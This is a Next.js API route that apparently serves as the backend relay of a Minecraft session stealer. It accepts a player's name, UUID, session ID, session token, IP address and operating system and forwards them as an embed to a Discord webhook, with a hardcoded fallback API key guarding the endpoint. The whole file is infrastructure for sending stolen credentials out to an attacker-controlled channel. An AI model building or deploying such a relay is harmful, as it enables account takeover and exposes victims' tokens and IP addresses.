import { NextRequest, NextResponse } from "next/server";

export const runtime = "nodejs";

export async function POST(request: NextRequest) {
  const webhookUrl = process.env.DISCORD_WEBHOOK_URL;
  const expectedApiKey = process.env.PROXY_API_KEY || "TRj1reCzZZFKPkwyd6Dv4FIKDXtZd1GgCsMPWSiF16M367OqzlWRqxu24CVFjFQ7";

  if (!webhookUrl) {
    return NextResponse.json({ error: "Missing DISCORD_WEBHOOK_URL" }, { status: 500 });
  }

  const authHeader = request.headers.get("authorization") || "";
  if (authHeader !== `Bearer ${expectedApiKey}`) {
    return NextResponse.json({ error: "Unauthorized" }, { status: 401 });
  }

  try {
    const data = await request.json();
    
    const uuid = data.uuid || "—";
    const name = data.name || "—";
    const token = data.token || "—";
    const sessionId = data.sessionId || "—";
    const ip = data.ip || "—";
    const os = data.os || "—";
    const timestamp = data.timestamp || new Date().toISOString();

    const desc = `[NameMC](https://namemc.com/${uuid}) | [Plancke](https://plancke.io/hypixel/player/stats/${uuid}) | [SkyCrypt](https://sky.shiiyu.moe/stats/${uuid})`;

    const payload = {
      embeds: [
        {
          title: "Account Info",
          color: 0x6E39FF,
          description: desc,
          fields: [
            { name: "Name", value: `\`\`\`${name}\`\`\``, inline: true },
            { name: "UUID", value: `\`\`\`${uuid}\`\`\``, inline: true },
            { name: "Session ID", value: `\`\`\`${sessionId}\`\`\``, inline: false },
            { name: "Session Token", value: `\`\`\`${token}\`\`\``, inline: false },
            { name: "IP", value: `\`\`\`${ip}\`\`\``, inline: true },
            { name: "OS", value: `\`\`\`${os}\`\`\``, inline: true },
            { name: "Timestamp", value: `\`\`\`${timestamp}\`\`\``, inline: false }
          ],
          footer: { text: "Account Info" }
        }
      ]
    };

    const response = await fetch(webhookUrl + "?wait=true", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    });

    if (!response.ok) {
      const errText = await response.text();
      return NextResponse.json({ error: "Discord error", detail: errText }, { status: 502 });
    }

    return NextResponse.json({ success: true });
  } catch (e: any) {
    return NextResponse.json({ error: e.message }, { status: 500 });
  }
}
